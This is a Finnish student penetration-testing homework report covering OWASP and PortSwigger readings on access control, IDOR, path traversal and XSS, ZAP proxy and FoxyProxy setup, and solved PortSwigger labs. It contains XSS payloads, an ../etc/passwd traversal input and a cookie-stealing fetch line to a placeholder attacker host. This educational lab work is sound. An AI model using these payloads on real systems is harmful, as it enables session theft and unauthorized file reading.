## x) Lue/katso ja tiivistä

### OWASP 2021: OWASP Top 10:2021

* Tiivistelmä:
  * Broken Access Control nousee vuoden 2021 OWASP Top 10 -listan kärkisijalle (A01). Se tarkoittaa tilannetta, jossa järjestelmä ei valvo käyttöoikeuksia riittävän tiukasti, jolloin käyttäjä pääsee käsiksi tietoihin tai toimintoihin, joihin hänellä ei pitäisi olla valtuuksia.
  * Haavoittuvuus kattaa useita tunnettuja hyökkäysvektoreita, kuten IDOR (Insecure Direct Object References), Path Traversal, CORS-virhekonfiguraatiot sekä käyttöoikeuksien ohittamisen muokkaamalla URL-osoitetta tai HTTP-pyynnön parametreja.
  * Korjaamiseen suositellaan "deny by default" -periaatetta, keskitettyä käyttöoikeuksien tarkistuslogiikkaa palvelinpuolella sekä kaikkien suorien objektiviitteiden korvaamista epäsuorilla/satunnaisilla tunnisteilla (GUID/UUID).
 
* Oma huomio:
  
    * Infrastruktuurin näkökulmasta on mielenkiintoista, miten usein käyttöoikeustarkistukset jätetään pelkän käyttöliittymän (frontend) varaan. Jos API-rajapinta ei validoi pyyntöä tekevää sessiota suhteessa pyydettyyn resurssiin palvelimella, mikään määrä piilotettuja nappeja UI:ssa ei suojaa järjestelmää.

### PortSwigger Academy: Insecure Direct Object References (IDOR)

* Tiivistelmä:
  * IDOR on Broken Access Controlin alalaji, jossa sovellus käyttää käyttäjän syötettä (esim. parametria `?user_id=102`) suoraan tietokantakyselyssä tai tiedostojärjestelmässä ilman, että pyynnön tekijän oikeuksia varmistetaan.
  * Hyökkääjä voi vaihtaa parametrin arvoa (`?user_id=103`) ja päästä käsiksi toisen käyttäjän yksityisiin tietoihin, kuten laskuihin, profiilitietoihin tai chat-lokitiedostoihin.

* Oma huomio:
  
    * IDOR on konseptina erittäin yksinkertainen, mutta sen automaattinen skannaus on vaikeaa, koska skanneri ei aina tiedä, mikä parametri on tarkoitettu julkiseksi ja mikä luottamukselliseksi. Tämä tekee siitä erinomaisen kohteen manuaaliselle testaukselle.

## PortSwigger Academy: Path Traversal

* Tiivistelmä:

  * Path traversal (tai directory traversal) mahdollistaa hyökkääjälle mielivaltaisten tiedostojen lukemisen palvelimen tiedostojärjestelmästä.
  * Haavoittuvuus syntyy, kun sovellus ottaa tiedostonimen syötteenä (esim. `filename=kuva.png`) ja liittää sen tiedostopolkuun ilman sanitointia.
  * Suhteellisten polkujen kiipeäminen perustuu `../` sekvensseihin, joilla päästään pois sovelluksen juurihakemistosta (esim. `/var/www/html/`) palvelimen järjestelmähakemistoihin (esim. `/etc/passwd`).
    
* Oma huomio:
  
    * Miten nykyaikaiset konttiympäristöt (Docker/Podman) vaikuttavat Path Traversalin vakavuuteen? Vaikka hyökkääjä pääsisi lukemaan `/etc/passwd` tiedoston, hän lukee vain isolated container ympäristön tiedostoa, ei isäntäjärjestelmän (host).


### PortSwigger Academy: Cross-Site Scripting (XSS)

* Tiivistelmä:

  * XSS-haavoittuvuudessa hyökkääjä syöttää haitallista JavaScript-koodia verkkosivulle, ja uhrin selain suorittaa sen luottaen sivustoon.
  * Jaetaan kolmeen päätyyppiin:
    
    * Reflected XSS: Haitallinen skripti tulee HTTP-pyynnön mukana (esim. hakukentän parametrisuosikkilinkissä) ja heijastuu välittömästi takaisin vastauksessa.
    * Stored XSS: Haitallinen kripte tallennetaan tietokantaan (esim. kommenttikenttä tai profiilikuvaus), josta se latautuu kaikille sivua katsoville käyttäjille.
    * DOM-based XSS: Haavoittuvuus on täysin asiakaspuolen (client-side) JavaScript-koodissa, joka käsittelee epäluotettavaa syötettä turvattomasti.

* Oma huomio:
  
    * Monesti XSS demonstroidaan `alert()` funktiolla, mutta todellisessa hyökkäyksessä vaara liittyy istuntokaappaukseen (Session Hijacking via `document.cookie`) tai näkymättömään tiedonkalasteluun samalla domainilla.


 

### Lähteet:

Vinkit ja tehtävä itsessään: https://terokarvinen.com/tunkeutumistestaus/


 ## a) Totally Legit Certificate – OWASP ZAP & CA-Sertifikaatin Asennus

 ### Tavoite

 Asentaa OWASP ZAP Kali Linuxiin, generoida ZAP:n CA-sertifikaatti, tuoda se Firefox-selaimeen ja reitittää selaimen liikenne ZAP-proxyn läpi. Varmistetaan, että myös kuva-informaatio siepataan.

Päivitettiin Kali Linuxin pakettilistat (`sudo apt-get update`) ja asennettiin ZAP-proxy (`sudo apt-get install -y zaproxy`).

 <img width="849" height="562" alt="image" src="https://github.com/user-attachments/assets/8e221909-f858-43d7-924c-ca212dc8d7a0" />
 

Sertifikaatin luonti ja vienti: Generoitiin OWASP ZAPissa uusi juurisertifikaatti (Dynamic SSL Certificate) ja tallennettiin se järjestelmään nimellä `zap_root_ca.cer`.


<img width="1120" height="639" alt="image" src="https://github.com/user-attachments/assets/116e9019-cee6-4ed1-b139-b794973cd138" />

 
 <img width="682" height="362" alt="image" src="https://github.com/user-attachments/assets/ee8f278a-852b-479b-a938-55640433634b" />



CA-sertifikaatin luottamus: Tuotiin generoitu sertifikaatti Firefox-selaimen sertifikaattihallintaan (Authorities-välilehdelle) ja asetettiin selain luottamaan siihen verkkosivustojen tunnistamisessa.


<img width="740" height="153" alt="image" src="https://github.com/user-attachments/assets/008fdcf7-cb54-453c-9a16-ebc8b57df680" />


Valitaan luotu ZAP sertifikaatti

<img width="771" height="312" alt="image" src="https://github.com/user-attachments/assets/5870e973-b82f-4456-8a96-db6cf52e6ace" />


Näkyy Firefox sertifikaateissa

<img width="672" height="462" alt="image" src="https://github.com/user-attachments/assets/e5b7d7a1-5c28-4a42-bc6f-655e1e66144d" />



Näen asennetun kuvan `http://localhost:8000/testi.png`

<img width="1216" height="775" alt="image" src="https://github.com/user-attachments/assets/90a1c3e3-ff7e-4cca-8180-cb1199bdf5da" />



Liikenteen varmentaminen ja kaappaus: Käynnistettiin paikallinen HTTP-palvelin porttiin 8000 ja ohjattiin Firefoxin liikenne ZAP-proxyn läpi (portti 8080). Testikuvapyyntö (`http://localhost:8000/testi.png`) saatiin kaapattua onnistuneesti ZAPiin, mikä näkyy suoraan ZAPin Sites-puussa ja pyynnön otsaketiedoissa (Request).

 <img width="1899" height="881" alt="image" src="https://github.com/user-attachments/assets/bd98f61d-17e4-40fe-a44b-6a97718f810c" />


## b) Kettumaista

### FoxyProxy Standard asennus

* Asensin FoxyProxy Standard laajennuksen `addons.mozilla.org:sta`
* Laajennus mahdollistaa selaimen HTTP/HTTPS-liikenteen ketterän reitittämisen eri välityspalvelimille ilman selaimen omien verkkoasetusten jatkuvaa manuaalista muokkaamista.

<img width="840" height="445" alt="image" src="https://github.com/user-attachments/assets/05a0f361-1fff-43ce-abb5-fc0667dc0187" />


### Proxin lisääminen:

* Lisäsin FoxyProxyyn uuden proxy-profiilin nimellä OWASP.
* Konfiguroin osoitteeksi `localhost` ja portiksi `8080` mikä vastaa OWASP ZAPin oletusarvoista kuunteluporttia.
* Asetettiin sääntöjä (Proxy by Patterns), joilla määriteltiin mitä liikennettä proxyn läpi ohjataan (mm. `http://localhost*` ja PortSwigger Academy osoitteet).

  
<img width="993" height="532" alt="image" src="https://github.com/user-attachments/assets/6525fbfd-7432-403c-ab90-66481b868578" />


<img width="1907" height="884" alt="image" src="https://github.com/user-attachments/assets/1ff46b7f-2947-48c3-abd9-3e5e38171c4d" />


### ZAP tulos FoxyProxyn laajenuksen jälkeen:   

* Testasin FoxyProxyn toimintaa Proxy by Patterns tilassa avaamalla selaimella paikallinen osoite `http://localhost:8000/testi.png`
* Selaimen tekemä `GET /testi.png` pyyntö ohjautui määritetyn säännön ansiosta FoxyProxyn läpi ZAPiin, jossa se tallentui On-Access History lokille ja näkyi Sites-puussa.


FoxyProxy Pattern tilassa:

<img width="1890" height="760" alt="proxy" src="https://github.com/user-attachments/assets/0aebaea3-5c0a-4e6a-98cc-8f19d298485d" />



**Yhteys `http://localhost:8000`**

* Otin yhteyttä paikalliseen testipalvelimeen (`http://localhost:8000`).
* ZAP kaappasi onnistuneesti sekä juuripyynnön (`GET: /`) että kuvapyynnön (`GET:testi.png`), mikä osoittaa välityspalvelimen ja FoxyProxy-integraation toimivan täysin odotetusti.

<img width="1897" height="895" alt="image" src="https://github.com/user-attachments/assets/77bc0fda-0821-4678-a890-4d68569b212c" />




## C) PortSwigger Labs - Cross Site Scripting (XSS)

### Havainnointi ja haavoittuvuuden etsintä.
* Avasin labran ja ohjasin selaimen liikenteen ZAP-välityspalvelimelle FoxyProxyn kautta. Hakukenttään syötin aluksi testisyöteen `test123`.
  
<img width="1876" height="383" alt="image" src="https://github.com/user-attachments/assets/f5afe84a-5688-486d-8243-977a3f73f74b" />



<img width="770" height="236" alt="image" src="https://github.com/user-attachments/assets/d35be46e-3d24-4702-a574-d5496f50350e" />

* ZAPin Response-välilehdeltä pääsee tarkistamaan palvelimen palauttamaa raaka-HTML-koodia. Havaitsin, että syöte heijastuu suoraan sivun koodiin osaksi otsikkoelementtiä `<h1>0 search results for 'test123'</h1>`.
  

<img width="1897" height="722" alt="image" src="https://github.com/user-attachments/assets/5d3dad50-47cf-44eb-aaf7-cf6d8da224b9" />



### Haavoittuvuuden varmentaminen

* HTML-injektio: Hakukenttään kokeiltiin syöttää HTML-tägiä `<h1>Test</h1>`. Sivu renderöi tekstin otsikkona ja ZAP vahvisti, ettei palvelin muunnanut merkkejä (`<`, `>`) turvalliseen muotoon.
* Miksi hyökkäys toimii: Palvelin ei sanitoi tai enkoodaa käyttäjän antamaa syötettä millään tavalla ennen sen liittämistä osaksi dynaamista HTML-vastinetta.


<img width="1364" height="678" alt="image" src="https://github.com/user-attachments/assets/997032d7-9dc4-422a-a853-a3146e7eaa65" />



### Hyökkäyksen suoritus

Payload: Hakukentän kautta syötettiin suoritettavaa JavaScript-koodia sisältävä tägi `<script>alert(1)</script>`

<img width="1899" height="929" alt="image" src="https://github.com/user-attachments/assets/45ad1aa8-40f8-4797-8fc0-e4bd08cf6412" />

* Tulos: ZAP kaappasi pyynnön `GET /?search=%3Cscript%3Ealert(1)%3C/script%3E`, ja palvelin palautti koodin sellaisenaan vastauksessa (`<h1>0 search results for '<script>alert(1)</script>'</h1>`).


* Sertifiointi: Uhrin selain tulkitsi vastauksen suoritettavaksi koodiksi ja avasi `alert(1)` poptup-ikkunan, mikä ratkaisi labran.

  
<img width="1205" height="563" alt="image" src="https://github.com/user-attachments/assets/cf7f97cb-936e-4f29-bc12-eb5e8cdefa11" />


<img width="932" height="283" alt="image" src="https://github.com/user-attachments/assets/c39557b5-d551-412d-a93a-c3b7c09dd0c9" />



## d) Stored XSS into HTML context with nothing encoded


### Havainnointi ja syötteen lähettäminen

Tehtävänannossa neuvotaan jättämään kommentti joka palauttaa `alert` funktion kun blogin julkaisua katsotaan


<img width="1121" height="308" alt="image" src="https://github.com/user-attachments/assets/0d3d668d-563c-424a-beaa-3f79993cc661" />

* Avaus/testaus tehtiin blogikirjoituksen kommentointilomakkeella (`Leave a comment`).
* Kommenttikenttään (`Comment`) syötettiin JavaScript-payload: `<script>alert(1)</script>`, ja lomake lähetettiin HTTP POST -pyynnöllä palvelimelle.

Täytän kommenttikentän `<script>alert(1)</script>` funktiolla, täytän muut kentät Name: `Testaaja` Sähköposti: `test@test.com` Verkkosivu `https://example.com`

<img width="794" height="628" alt="image" src="https://github.com/user-attachments/assets/8b40c25e-7479-457e-8caa-b14b525e0263" />

### ZAP tulos (POST-pyyntö)

* Palvelin otti POST-pyynnön vastaan ja tallensi syötteen sellaisenaan tietokantaan ilman minkäänlaista sanitointia tai tarkastusta.
* Kun blogisivu ladattiin uudelleen (`GET /post?postId=...`), palvelin haki kommentin tietokannasta ja sijoitti `<script>` tägin suoraan HTML-vastauksen sekaan ilman HTML-enkoodausta
* Toisin kuin heijastuneessa (Reflected) XSS-hyökkäyksessä, tässä koodi suoriutuu automaattisesti jokaisella sivun latauskerralla ja kaikille käyttäjille, jotka avaavat kyseisen blogikirjoituksen.

<img width="1714" height="790" alt="image" src="https://github.com/user-attachments/assets/f4094adc-278a-40ee-b088-24b64c34cc72" />



### ZAP (Response)


<img width="1897" height="823" alt="image" src="https://github.com/user-attachments/assets/8f3b679e-c4f4-4098-878e-37a39779cbb5" />


### Labra ratkaistu

Kun sivun päivittää Popup ilmestyy uudelleen ilman, että tarvitsis uutta kommenttia jättää. Tämä todistaa haavoittuvuuden olevan tallennettu.

<img width="1706" height="820" alt="image" src="https://github.com/user-attachments/assets/75e0a94e-96b8-4b2f-9faf-bdb5487a2766" />


Labra meni sillä läpi:

<img width="976" height="474" alt="image" src="https://github.com/user-attachments/assets/88b07fd4-2a3b-4a19-a68f-f2e43ccbbb83" />


## e) Mitä hyökkääjä hyötyy XSS-hyökkäyksestä?

Cross-Site Scripting (XSS) mahdollistaa mielivaltaisen JavaScript-koodin suorittamisen uhrin selaimessa kyseisen sivuston kontekstissa. Tämä antaa hyökkääjälle laajat oikeudet toimia uhrin henkilöllisyydellä.

### Keskeiset hyödyt ja reaalimaailman esimerkit:

* Istuntokaappaus (Session Hijacking / Cookie Theft):
  
   *  Miten toimii: JavaScript pystyy lukemaan selaimen evästeet (`document.cookie`). Jos sivusto tallentaa istuntotunnisteen (session token) evästeeseen ilman `HttpOnly` lippua, hyökkääjä voi lähettää sen omalle palvelimelleen:
   *  `fetch('https://attacker.com/steal?cookie=' + document.cookie);`
   *  Seuraus: Hyökkääjä syöttää varastetun evästeen omaan selaimeensa ja pääsee sisään uhrin tilille ilman salasanaa.

* Toimintojen kaappaus uhrin puolesta (CSRF-tyyppinen toiminta):

    * Miten toimii: Hyökkääjä voi laittaa skriptin tekemään taustalla taustapyyntöjä (esim. `fetch` tai `XMLHttpRequest`) uhrin jo kirjautuneessa istunnossa.
    * Esimerkki: Skripti muuttaa uhrin sähköpostiosoitteen tai salasanan profiiliasetuksista, siirtää rahaa verkkopankissa tai lähettää viestejä uhrin nimissä.

 * Kirjautumistietojen kalastelu (DOM-based Phishing):
   
    * Miten toimii: Hyökkääjä muokkaa sivun rakennetta (DOM) ajon aikana ja näyttää väärennetyn kirjautumisikkunan ("Istuntosi on vanhentunut, kirjaudu uudelleen").
    * Seuraus: Kun käyttäjä syöttää käyttäjätunnuksen ja salasanan, ne päätyvät suoraan hyökkääjän palvelimelle.

 * Näppäilynkaappaus (Keylogging):

    * Miten toimii: Skripti kuuntelee käyttäjän näppäinpainalluksia kyseisellä sivulla (`addEventListener('keydown', ...)`).
    * Seuraus: Kaikki lomakkeisiin kirjoitettu data (kuten luottokorttinumerot ja henkilötiedot) tallentuu hyökkääjälle jo ennen lomakkeen lähetystä.



## f) Lab: File path traversal

<img width="1113" height="315" alt="image" src="https://github.com/user-attachments/assets/700d2914-4fbd-4ffe-a30c-d61d8b38ebd0" />

### Kohteen paikallistaminen:
* Vallitaan kuva ja kopioidan kuvan osioite.


<img width="1223" height="554" alt="image" src="https://github.com/user-attachments/assets/547a9f9b-bb45-45bd-a274-85af9fb785fe" />

* Avaan kuvan toisessa välilehdessä, liikenteen ZAP suodattaa ja saan sen `Sites` näkymään.
    
<img width="1345" height="728" alt="image" src="https://github.com/user-attachments/assets/1d12e8d6-ae72-4742-844a-eeabe03af210" />


Tulos ZAP:ssa 

<img width="1614" height="374" alt="image" src="https://github.com/user-attachments/assets/3a1d5ebf-385f-4229-afe9-de04b03036c9" />


* `GET:image(filename)` sivua hiiren oikealla klikkaamalla ja valitsemalla `Open in request tab` päästään muokkaamaan osoiteriviä.

<img width="2666" height="795" alt="image" src="https://github.com/user-attachments/assets/f62a48e6-361b-4c3b-b564-dd34ccaf4854" />

* Korvaamalla osoiterivistä kuvan nimen `70.jpg` -> `filename=../../../../etc/passwd` päästään näkemään tiedoston sisällön (täytyy muuttaa `Response` ikkunasta `Body: Image -> Body: Text`, jotta pystyy lukea tiedoston sisällön.


